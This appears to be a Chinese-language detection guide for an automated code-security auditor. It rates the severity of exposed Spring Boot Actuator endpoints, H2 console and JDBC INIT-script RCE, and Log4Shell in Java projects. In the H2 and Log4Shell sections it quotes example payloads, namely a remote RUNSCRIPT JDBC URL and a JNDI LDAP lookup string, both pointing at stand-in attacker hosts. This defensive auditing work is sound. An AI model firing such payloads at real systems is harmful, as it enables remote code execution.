# 组件漏洞（Actuator + H2 RCE + Log4Shell）判断知识

本类别覆盖特定依赖/组件的配置和版本风险。

---

## A. Spring Boot Actuator 暴露判断知识

**只要 `spring-boot-starter-actuator` 在依赖中，Actuator 即默认存在。**

高危端点：`/actuator/env`（泄露密码）、`/actuator/heapdump`（下载堆内存）、`/actuator/shutdown`（关闭应用）。

### Actuator 判断规则

| 场景 | 严重度 |
|------|--------|
| Actuator 存在 + 完全无 Security 配置 | **CRITICAL** |
| Actuator 存在 + 有 Security 但未覆盖 `/actuator` + `include=*` | **CRITICAL** |
| Actuator 存在 + 有 Security 但未覆盖 `/actuator` + 默认暴露 | **HIGH** |
| 自定义 `@Endpoint` 无认证 | **HIGH** |
| 仅暴露 health/info + 有认证 | 安全，不上报 |

### Actuator 验证要点

- 用 Grep 搜索 `actuator` 相关依赖和配置
- 检查 `application.yml`/`application.properties` 中的 `management.endpoints.web.exposure.include`
- 检查 `SecurityFilterChain` 是否覆盖 `/actuator/**` 路径
- 仅在 `test/` 目录下发现 → 降级为 **MEDIUM**
- Spring Boot 默认仅暴露 `/actuator/health` 和 `/actuator/info`
- **只要 actuator 在依赖中 + 无 Security 配置 → 必须上报 CRITICAL**

`rule_id` 命名：`actuator-no-security`、`actuator-exposed-no-auth`、`actuator-custom-endpoint`。

---

## B. H2 数据库 RCE 判断知识

H2 嵌入式数据库的两类高危 RCE 路径：
1. **H2 Console 未授权访问**：`spring.h2.console.enabled=true` 且无认证，攻击者通过 `/h2-console` 执行 `CREATE ALIAS` 调用 Java 代码
2. **JDBC URL INIT 脚本**：`jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil.com/x.sql'`

### H2 RCE 判断规则

| 场景 | 严重度 |
|------|--------|
| H2 Console 启用 + 无认证 + H2 < 2.x | **CRITICAL** |
| H2 Console 启用 + 有认证但版本 < 2.x | **HIGH** |
| JDBC URL 含 INIT/RUNSCRIPT 参数 | **CRITICAL** |
| 仅测试目录中 H2 配置 | **MEDIUM** |

### H2 RCE 验证要点

- 用 Grep 搜索 `h2.console.enabled`、`h2-console`、`INIT=RUNSCRIPT`
- 结合 tech_profile 中的 H2 版本判断（H2 2.x 修复了部分 Console RCE）
- 检查 JDBC URL 是否来自配置文件还是用户可控输入
- 仅在 `test/` 目录或 test profile 中发现 → 风险降低
- 检查 SecurityFilterChain 是否保护了 `/h2-console/**`

`rule_id` 命名：`h2-console-exposed`、`h2-init-script`。

---

## C. Log4Shell (CVE-2021-44228) 判断知识

Log4j 2.x（< 2.15.0）解析日志中的 `${jndi:ldap://attacker.com/a}` 触发 RCE，CVSS 10.0。
- **受影响**：log4j-core 2.0-beta9 ~ 2.14.1
- **部分缓解**：2.15.0
- **完全修复**：2.17.1+

### Log4Shell 判断规则

| 场景 | 严重度 |
|------|--------|
| 用户输入 → Logger + 版本 2.0~2.14.1 | **CRITICAL** |
| 用户输入 → Logger + 版本未知/2.15~2.16 | **HIGH** |
| 用户输入 → Logger + 版本 ≥ 2.17.1 | **LOW**（已修复） |
| 无用户输入流向 Logger | 安全，不上报 |

### Log4Shell 验证要点

- 首先检查 tech_profile 中的 log4j 版本
- 候选路径终点为 JNDI_LOOKUP sink 时直接确认——但本类别更关注日志调用
- 用 Grep 搜索 `logger.info`/`logger.error` 等调用，检查参数是否含 HTTP 请求值
- 检查 `log4j2.formatMsgNoLookups=true` 系统属性或环境变量（2.10+ 缓解）
- 检查 `LOG4J_FORMAT_MSG_NO_LOOKUPS` 环境变量

`rule_id` 命名：`log4shell-taint`、`log4j-version-vulnerable`。
